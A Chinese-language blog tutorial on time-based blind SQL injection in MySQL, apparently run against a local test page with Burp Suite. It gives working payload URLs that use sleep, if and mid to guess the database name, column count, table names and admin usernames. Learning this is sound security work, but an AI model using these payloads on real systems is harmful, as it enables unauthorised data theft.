---
title: Mysql Time Blind Injection
date: 2017-10-08 21:11:48
categories:
	- Sql Injection
tags:
	- Mysql blind Injection
---

前言：有些注入点在注入时并无回显，这时候我们可以通过基于时间的注入实现继续注入。<!-- more -->


```
首先我们先来看几个函数。
1.sleep(x) -- 延迟函数，延迟多少秒取决于x的值。
2.length(x) -- 查看x字符串的长度。
3.if(x,1,0) -- 判断函数，若x为真的执行1，假0.
4.mid(database(),start,length) -- mid函数用于得到一个字符串的一部分，例如mid(user,1,1)='u' 即 user 从1开始长度为1的字符是否等于u。
5.database() --查看当前使用的数据库名
```

## 结合Burp Suite工具进行演示基于时间的盲注。

### 环境

![vnc](http://owrmua5nw.bkt.clouddn.com/%E7%8E%AF%E5%A2%83.png)

### 判断注入

![if](http://owrmua5nw.bkt.clouddn.com/%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5.png)

### 判断数据库长度

![database_length](http://owrmua5nw.bkt.clouddn.com/%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E9%95%BF%E5%BA%A6.png)

```
http://127.0.0.1/test.php?id=1 and if((length(database())='4'),sleep(5),0)
```

### 猜数据库名

![database_name](http://owrmua5nw.bkt.clouddn.com/%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%90%8D%E5%AD%97.png)

```
http://127.0.0.1/test.php?id=1 and if((mid(database(),1,1)='t'),sleep(5),0)
```

### 猜字段

![filed](http://owrmua5nw.bkt.clouddn.com/%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5.png)

```
http://127.0.0.1/test.php?id=1 union select 1,2,sleep(5)
字段一直加下去，当延迟五秒时，则可以判定为多少字段。
```

### 猜表名

![table_name](http://owrmua5nw.bkt.clouddn.com/%E7%8C%9C%E8%A1%A8%E5%90%8D.png)

```
http://127.0.0.1/test.php?id=1 union select 1,2,if((mid(table_name,1,1)='a'),sleep(5),0) from information_schema.tables where table_schema='test'
```

### 获取表名，列名后猜数据

![data](http://owrmua5nw.bkt.clouddn.com/%E7%8C%9C%E6%95%B0%E6%8D%AE.png)

```
http://127.0.0.1/test.php?id=1 union select 1,2,if((mid(username,1,1)='a'),sleep(5),0) from admin
```

```
1.时间的注入是以整个mid,length函数作为if的参数。
2.语句都是可以直接在浏览器上输入的，不一定要用工具抓包在注入，
3.个人理解，仅供参考。
```

